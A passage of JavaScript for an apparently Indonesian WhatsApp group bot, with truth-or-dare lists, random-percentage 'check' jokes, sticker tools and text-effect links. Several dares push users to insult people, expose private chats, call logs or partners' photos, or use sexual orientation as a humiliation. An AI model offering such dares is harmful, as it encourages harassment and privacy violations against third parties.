   let medi = fs.readFileSync('./' + buff)
  await NFSBotInc.sendMessage(from, { image: medi, caption:"Ini dia!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
  case 'dare':
              const dare =[
    "makan nasi 2 sendok makan tanpa lauk apapun, kalau seret bisa diminum",
    "menumpahkan orang yang membuat Anda berhenti",
    "hubungi crush/acar sekarang dan kirim ss",
    "menjatuhkan hanya emote setiap kali mengetik di gc/pc selama 1 hari.",
    "Ucapkan selamat datang pada yang ingin menjadi jutawan! ke semua grup yang Anda miliki",
    "panggil mantan bilang rindu",
    "nyanyikan bagian refrein dari lagu terakhir yang kamu mainkan",
    "vn mantan/naksir/pacar kamu, sapa (name), mau telpon, sebentar. aku sangat merindukanmu",
	"Bang di atas meja (yang ada di rumah) sampai dimarahi karena berisik",
    "Beri tahu orang secara acak _Saya baru saja diberi tahu bahwa saya adalah saudara kembar Anda terlebih dahulu, kami berpisah, lalu saya menjalani operasi plastik. Dan ini yang paling ciyusss_",
    "sebutin nama mantan",
    "buat 1 sajak untuk para member!",
    "kirim daftar obrolan whatsapp Anda",
    "mengobrol dengan orang acak dengan bahasa gheto lalu ss di sini",
    "ceritakan hal memalukan versimu sendiri",
    "tag orang yang kamu benci",
    "Berpura-pura kesurupan, misalnya: kesurupan anjing, kesurupan belalang, kesurupan kulkas, dll.",
    "ganti nama menjadi *AKU KELEDAI* selama 24 jam",
    "teriak *aku gila aku gila* di depan rumahmu",
    "jepret / posting foto pacar / naksir",
    "sebutkan tipe pacarmu!",
        "katakan *aku naksir kamu, kamu mau jadi pacarku?* ke lawan jenis, terakhir kali kamu chat (submit di wa/tele), tunggu dia balas, kalau punya, mampir ke sini",
    "rekam suaramu yang berbunyi *titar ke umur do titar, titar ke piche do titar*",
    "prank chat mantan dan bilang *i love u, please come back.* tanpa bilang dare!",
    "obrolan ke kontak wa sesuai urutan % baterai anda, lalu beritahu dia *saya beruntung bisa mendapatkan anda!*",
    "ganti nama jadi *aku anak randi* selama 5 jam",
    "ketik bahasa bengali 24 jam",
    "Gunakan foto selmon bhoi selama 3 hari",
    "jatuhkan kutipan lagu lalu beri tag anggota yang cocok untuk kutipan itu",
    "Kirim catatan suara mengatakan bisakah aku memanggilmu sayang?",
    "ss baru-baru ini menelepon whatsapp",
    "Katakan *KAU SANGAT INDAH JANGAN BERBOHONG* kepada teman-teman!",
    "muncul ke anggota grup, dan katakan fuck you",
    "Bertingkah seperti ayam di depan orang tuamu",
    "Ambil buku acak dan baca satu halaman dengan lantang di vn n kirimkan ke sini",
    "Buka pintu depanmu dan melolong seperti serigala selama 10 detik",
    "Ambil selfie yang memalukan dan tempel di foto profil Anda",
    "Biarkan kelompok memilih kata dan lagu terkenal. Anda harus menyanyikan lagu itu dan mengirimkannya dalam catatan suara",
    "Berjalan dengan siku dan lutut selama mungkin",
    "nyanyikan lagu kebangsaan dengan nada suara",
    "Breakdance selama 30 detik di ruang dudukðŸ˜‚",
    "Ceritakan kisah paling menyedihkan yang kamu tahu",
    "buat video tarian twerk dan statuskan selama 5 menit",
    "Makan sepotong bawang putih mentah",
    "Tunjukkan lima orang terakhir yang Anda kirimi SMS dan isi pesannya",
    "cantumkan nama lengkap Anda pada status selama 5 jam",
    "buat video dansa pendek tanpa filter apa pun hanya dengan musik dan letakkan di status Anda selama 5 jam",
    "panggil sahabatmu, jalang",
    "letakkan foto Anda tanpa filter pada status Anda selama 10 menit",
    "katakan saya suka oli london di catatan suaraðŸ¤£ðŸ¤£",
    "Kirim pesan ke mantanmu dan katakan aku masih menyukaimu",
    "hubungi Crush/pacar/sahabat sekarang dan tangkapan layar di sini",
    "muncul ke salah satu obrolan pribadi anggota grup dan Katakan kamu bustard jelek",
    "katakan KAMU CANTIK/TAMPAN kepada salah satu orang yang ada di daftar pin atas kamu atau orang pertama di daftar obrolan kamu",
    "kirim catatan suara dan katakan, bolehkah aku meneleponmu sayang, jika laki-lakimu, tandai perempuan/jika perempuan, tandai laki-laki",
    "tulis i love you (nama anggota grup acak, yang sedang online) di obrolan pribadi, (jika laki-laki tulis nama perempuan/jika perempuan tulis nama laki-laki) ambil fotonya dan kirim ke sini",
    "gunakan foto aktor bollywood apa pun sebagai pfp Anda selama 3 hari",
    "letakkan foto gebetanmu di status dengan keterangan, ini gebetanku",
    "ganti nama menjadi I AM GAY selama 5 jam",
    "ngobrol dengan kontak mana pun di whatsapp dan katakan saya akan menjadi bf/gf Anda selama 5 jam",
    "Kirim catatan suara mengatakan aku naksir kamu, mau jadi pacarku atau tidak? ke sembarang orang dari grup (kalau kamu perempuan pilih laki-laki, kalau laki-laki pilih perempuan",
    "tampar pantatmu hampir tidak mengirimkan suara tamparan melalui catatan suaraðŸ˜‚",
    "sebutkan tipe gf/bf kamu dan kirim fotonya ke sini dengan keterangan, cewek/cowok paling jelek di dunia",
    "berteriak bravooooooooo dan kirim ke sini melalui voice note",
    "jepret wajahmu lalu kirim ke sini",
    "Kirim foto Anda dengan keterangan, saya lesbian",
    "berteriak menggunakan kata-kata kasar dan kirimkan ke sini melalui vn",
    "teriak kau bajingan di depan ibu/papamu",
    "ganti nama menjadi saya idiot selama 24 jam",
    "tampar dirimu dengan tegas dan kirim suara tamparan melalui catatan suaraðŸ˜‚",
    "katakan saya suka pemilik bot NFS melalui catatan suara",
    "kirim foto gf/bf kamu ke sini",
    "Buat video tantangan dance tiktok apa saja dan jadikan status, Anda dapat menghapusnya setelah 5 jam",
    "putus dengan sahabatmu selama 5 jam tanpa memberitahunya bahwa itu berani",
     "Katakan pada salah satu temanmu bahwa kamu mencintainya dan ingin menikah dengannya, tanpa memberitahunya bahwa itu sebuah tantangan",
     "katakan aku cinta depak kalal lewat voice note",
     "tulis saya merasa terangsang dan letakkan di status, Anda dapat menghapusnya hanya setelah 5 jam",
     "tulis saya lesbian dan taruh di status, kamu hanya bisa menghapusnya setelah 5 jam",
     "cium ibu atau papamu dan katakan aku mencintaimuðŸ˜Œ",
     "cantumkan nama ayahmu di status selama 5 jam",
     "kirim kata-kata kasar di grup mana pun, kecuali grup ini, dan kirim bukti tangkapan layar di sini"
]
              const NFSdare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              NFSBotInc.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ NFSdare }, {quoted:m})
              break
                            break
       case 'truth':
              const truth =[
    "Apakah kamu pernah menyukai seseorang? Berapa lama?",
    "Kalau bisa atau kalau mau, gc/gc luar yang mana yang akan kamu jadikan teman? (mungkin beda/tipe sama)",
    "apa ketakutan terbesar kamu?",
    "Pernahkah kamu menyukai seseorang dan merasa orang itu juga menyukaimu?",
    "Siapa nama mantan pacar temanmu yang dulu kamu suka diam-diam?",
    "Apakah kamu pernah mencuri uang dari ayah atau ibumu? Alasannya?",
    "Apa yang membuatmu bahagia saat sedih?",
    "Pernah cinta bertepuk sebelah tangan? Kalo pernah sama siapa? gimana rasanya gan?",
    "pernah menjadi simpanan seseorang?",
    "hal yang paling ditakuti",
    "Siapakah orang yang paling berpengaruh dalam hidupmu?",
    "Hal yang membanggakan apa yang kamu dapatkan tahun ini",
    "Siapa orang yang bisa membuatmu luar biasa",
    "Siapakah orang yang pernah membuatmu sangat bahagia?",
    "Siapa yang paling dekat dengan tipe pasangan idealmu di sini",
    "Kamu suka main sama siapa??",
    "Pernahkah kamu menolak orang? Alasannya kenapa?",
    "Sebutkan kejadian yang membuatmu terluka yang masih kamu ingat",
    "Prestasi apa yang kamu dapatkan tahun ini??",
    "Apa kebiasaan terburukmu di sekolah??",
    "Lagu apa yang paling sering kamu nyanyikan saat mandi",
    "Apakah Anda pernah memiliki pengalaman mendekati kematian",
    "Kapan terakhir kali kamu benar-benar marah. Kenapa?",
    "Siapa orang terakhir yang meneleponmu",
    "Apakah kamu memiliki bakat tersembunyi, Apa itu",
    "Kata apa yang paling kamu benci?",
    "Apa video YouTube terakhir yang kamu tonton?",
    "Apa hal terakhir yang Anda cari di Google",
    "Dengan siapa di grup ini kamu ingin bertukar kehidupan selama seminggu",
    "Apa hal paling menakutkan yang pernah terjadi padamu",
    "Pernahkah kamu kentut dan menyalahkan orang lain",
    "Kapan terakhir kali kamu membuat orang lain menangis",
    "Pernahkah kamu meng-ghost teman",
    "Pernahkah kamu melihat mayat",
    "Siapa di antara anggota keluargamu yang paling mengganggumu dan mengapa",
    "Jika Anda harus menghapus satu aplikasi dari ponsel Anda, aplikasi mana yang akan dipilih",
    "Aplikasi apa yang paling Anda buang waktu",
    "Pernahkah kamu berpura-pura sakit untuk pulang sekolah",
    "Barang apa yang paling memalukan di kamarmu",
    "Lima barang apa yang akan kamu bawa jika kamu terjebak di pulau terpencil",
    "Pernahkah kamu tertawa begitu keras hingga pipis di celana",
    "Apakah kamu mencium bau kentutmu sendiri",
    "apakah kamu pernah pipis di tempat tidur saat tidur ???",
    "Apa kesalahan terbesar yang pernah kamu buat",
    "Pernahkah kamu menyontek saat ujian",
    "Apa hal terburuk yang pernah kamu lakukan",
    "Kapan terakhir kali kamu menangis",
    "siapa yang paling kamu cintai di antara orang tuamu",
    "Apakah kamu kadang-kadang memasukkan jarimu ke dalam lubang hidung?",
    "siapa yang kamu suka saat sekolah",
    "Katakan dengan jujur, apakah kamu menyukai laki-laki di grup ini",
    "apakah kamu pernah menyukai seseorang? sudah berapa lama?",
    "apakah kamu punya gf/bf', 'apa ketakutan terbesarmu?",
    "pernahkah kamu menyukai seseorang dan merasa orang itu juga menyukaimu?",
    "Siapa nama mantan pacar temanmu yang pernah kamu sukai diam-diam?",
    "pernahkah kamu mencuri uang ibumu atau uang ayahmu",
    "apa yang membuatmu bahagia saat kamu sedih",
    "apakah kamu menyukai seseorang yang ada digrup ini? kalau kamu lalu siapa?",
    "apakah kamu pernah ditipu orang?",
    "Siapakah orang yang paling penting dalam hidupmu",
    "Hal membanggakan apa yang kamu dapatkan tahun ini",
    "siapa orang yang bisa membuatmu bahagia saat kamu sedih",
    "Siapakah orang yang pernah membuatmu merasa tidak nyaman",
    "apakah kamu pernah berbohong kepada orang tuamu",
    "kamu masih suka mantan kamu",
    "dengan siapa kamu suka bermain bersama?",
    "apakah kamu pernah mencuri barang besar dalam hidupmu? alasannya kenapa?",
    "Sebutkan kejadian yang membuatmu terluka yang masih kamu ingat",
    "prestasi apa yang kamu dapatkan tahun ini?",
    "apa kebiasaan terburukmu di sekolah?",
    "apakah Anda menyukai pembuat bot, NFS?",
    "pernahkah kamu berpikir untuk membalas dendam dari gurumu?",
    "apakah Anda menyukai perdana menteri negara Anda saat ini",
    "Anda bukan sayuran atau sayuran",
    "jika kamu bisa menjadi tidak terlihat, apa hal pertama yang akan kamu lakukan",
    "rahasia apa yang kamu sembunyikan dari orang tuamu",
    "Siapa naksir rahasiamu",
    "siapa orang terakhir yang kamu creep di media sosial",
    "Jika seorang jin mengabulkan tiga keinginanmu, apa yang akan kamu minta",
    "Apa penyesalan terbesarmu",
    "Menurutmu binatang apa yang paling mirip denganmu",
    "Berapa banyak selfie yang kamu lakukan sehari",
    "Apa acara masa kecil favoritmu",
    "jika kamu bisa menjadi karakter fiksi selama sehari, siapa yang akan kamu pilih",
    "siapa yang paling sering kamu SMS",
    "Apa kebohongan terbesar yang pernah kamu katakan kepada orang tuamu",
    "Siapa selebritas yang kamu sukai",
    "Apa mimpi teraneh yang pernah kamu alami",
    "Apakah Anda bermain pubg, jika Anda kemudian mengirimkan nomor id Anda"
]
              const NFStruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              NFSBotInc.sendMessage(from, { image: buffertruth, caption: '_Anda memilih KEBENARAN_\n'+ NFStruth }, {quoted:m})
              break
case 'checkme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Bagus','Tidak ramah','Caper','Gila','Mengganggu','Bobrok','Orang pemarah','Sopan','Beban','Besar','Jijik','Pembohong','Otak Mesum']
					var hoby = ['Memasak','Tarian','Bermain','Game','Lukisan','Membantu Orang Lain','Menonton anime','Membaca','Mengendarai sepeda','Bernyanyi','Mengobrol','Berbagi Meme','Menggambar','Makan Uang Orang Tua','Bermain Kebenaran atau Tantangan','Tinggal Sendiri','Coli','Colmek']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Ya','TIDAK','Sangat jelek','Sangat tampan']
					var wetak= ['Merawat','Dermawan','Orang pemarah','PeMaaf','Penurut','Bagus','Saya minta maaf','Baik Hati','Sabar','UwU','Top','Bermanfaat']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Nama :* ${pushname}
*Sifat :* ${sipat}
*Hobi :* ${biho}
*Kebucinan :* ${bhucin}%
*Besar :* ${senga}%
*Ketampan :* ${chakep}
*Karakter :* ${watak}
*Tingkat Moral :* ${baik}%
*Keburukan Moral :* ${burug}%
*Kecerdasan :* ${cerdas}%
*Keberanian :* ${berani}%
*Ketakutan :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					buff = await getBuffer(defaultpp)
NFSBotInc.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
break
case 'toimg': {
	NFSStickWait()
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return replygcNFS(`_Balas ke Setiap Stiker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await NFSBotInc.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            NFSBotInc.sendMessage(m.chat, { image: buffer }, { quoted: m })      
fs.unlinkSync(name)
        })
        
} else return replygcNFS(`Harap balas stiker bukan animasi`)
    }
    break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!isPrem) return replyprem(mess.premium)
if (!args.join(" ")) return replygcNFS(`Dimana teksnya?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
NFSBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
NFSBotInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await NFSBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcNFS('Maksimal 10 Detik!')
let media = await quoted.download()
let encmedia = await NFSBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcNFS(`Foto/Video?`)
}
}
break
case 'qc': case'text': {
    if (!args[0] && !m.quoted) {
      return replygcNFS(`Dimana teksnya?`)
    }
    let userPfp
    if (m.quoted) {
      try {
        userPfp = await NFSBotInc.profilePictureUrl(m.quoted.sender, "image")
      } catch (e) {
        userPfp = defaultpp
      }
    } else {
      try {
        userPfp = await NFSBotInc.profilePictureUrl(m.sender, "image")
      } catch (e) {
        userPfp = defaultpp
      }
    }
    const waUserName = pushname
    const quoteText = m.quoted ? m.quoted.body : args.join(" ")
    const quoteJson = {
      type: "quote",
      format: "png",
      backgroundColor: "#FFFFFF",
      width: 700,
      height: 580,
      scale: 2,
      messages: [
        {
          entities: [],
          avatar: true,
          from: {
            id: 1,
            name: waUserName,
            photo: {
              url: userPfp,
            },
          },
          text: quoteText,
          replyMessage: {},
        },
      ],
    }
    try {
      const quoteResponse = await axios.post("https://bot.lyo.su/quote/generate", quoteJson, {
        headers: { "Content-Type": "application/json" },
      })
      const buffer = Buffer.from(quoteResponse.data.result.image, "base64")
      NFSBotInc.sendImageAsSticker(m.chat, buffer, m, {
        packname: packname,
        author: author,
      })
    } catch (error) {
      console.error(error)
      replygcNFS('Error')
    }
    }
    break
case 'sticker': case 'stiker': {
if (!quoted) return replygcNFS(`Kirim/Balas Gambar/Video/Gif Dengan Teks ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await NFSBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })

} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcNFS('Kirim/Balas Gambar/Video/Gif Dengan Teks ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await NFSBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })

} else {
replygcNFS(`Kirim/Balas Gambar/Video/Gif Dengan Teks ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break
case 'quotes':
const quoteNFSy = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quoteNFSy.data.quote.body}\n\n*${themeemoji} Pengarang:* ${quoteNFSy.data.quote.author}`
return replygcNFS(textquotes)
break
case 'handsomecheck':
				if (!text) return replygcNFS(`Menandai seseorang, Contoh : ${prefix + command} @NFS`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
NFSBotInc.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nMenjawab : *${teng}%*` }, { quoted: m })
					break
case 'beautifulcheck':
				if (!text) return replygcNFS(`Tag Seseorang, Contoh : ${prefix + command} @NFS`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
NFSBotInc.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nMenjawab : *${tik}%*` }, { quoted: m })
					break
					case 'charactercheck':
					if (!text) return replygcNFS(`Tag Seseorang, Contoh : ${prefix + command} @NFS`)
					const NFSy =['Penuh kasih','Dermawan','Pemarah','Pemaaf','Patuh','Bagus','Orang bodoh','Baik hati','sabar','Wow','puncak, pokoknya','Bermanfaat']
					const taky = NFSy[Math.floor(Math.random() * NFSy.length)]
					NFSBotInc.sendMessage(from, { text: `Pemeriksaan Karakter : ${q}\nMenjawab : *${taky}*` }, { quoted: m })
				     break
case 'awesomecheck': case 'greatcheck': case 'gaycheck': case 'cutecheck': case 'lesbicheck': case 'lesbiancheck': case 'hornycheck': case 'prettycheck': case 'lovelycheck': case 'uglycheck':
if (!m.isGroup) return NFSStickGroup()
const cex = body.slice(0)
const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
NFSBotInc.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nPemeriksa : ' + `@${mentionByReply.split('@')[0]}` + '\nMenjawab : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
} else if (mentionByTag[0] && isGroup) {
NFSBotInc.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nPemeriksa : ' + `@${mentionByTag[0].split('@')[0]}` + '\nMenjawab : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
} else if (!mentionByReply && !mentionByTag[0]) {
NFSBotInc.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nPemeriksa : ' + `@${sender.split('@')[0]}` + '\nMenjawab : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
}
break
case 'obfus': case 'obfuscate':{
if (!q) return replygcNFS(`*Contoh* ${prefix+command} lanjutan NFSbot = require('baileys')`)
let meg = await obfus(q)
replygcNFS(`Berhasil
${meg.result}`)
}
break
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return replygcNFS('Masukkan teks Kueri!')
                let anu = await styletext(text)
                let teks = `Gaya Teks Dari ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                replygcNFS(teks)
	    }
	    break
case 'candy': case 'christmas': case '3dchristmas': case 'sparklechristmas': case 'deepsea': case 'scifi': case 'rainbow': case 'waterpipe': case 'spooky': case 'pencil': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': case 'transformer': case 'berry': case 'thunder': case 'magma': case '3dstone': case 'neonlight': case 'glitch': case 'harrypotter': case 'brokenglass': case 'papercut': case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 'graffitibike': case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'dropwater': case 'toxic': case 'lava': case 'rock': case 'bloodglas': case 'hallowen': case 'darkgold': case 'joker': case 'wicker':case 'firework': case 'skeleton': case 'blackpink': case 'sand': case 'glue': case '1917': case 'leaves': {
if (!q) return replygcNFS(`*Contoh :* ${prefix+command} NFSBotInc`) 
NFSStickWait()
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
